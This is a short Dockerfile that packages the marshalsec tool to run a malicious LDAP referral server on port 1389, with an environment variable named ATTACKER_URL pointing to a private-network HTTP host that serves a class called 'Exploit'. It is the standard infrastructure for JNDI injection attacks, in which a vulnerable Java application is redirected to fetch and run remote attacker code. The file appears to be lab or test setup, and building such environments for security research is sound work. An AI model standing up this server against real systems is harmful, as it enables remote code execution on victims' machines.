FROM bellsoft/liberica-openjdk-debian:8u452
EXPOSE 1389
ENV ATTACKER_URL="http://192.168.76.1:8000/#Exploit"
ADD target/marshalsec-0.0.3-SNAPSHOT-all.jar app.jar
ENTRYPOINT ["java", "-cp", "/app.jar", "marshalsec.jndi.LDAPRefServer", "$ATTACKER_URL"]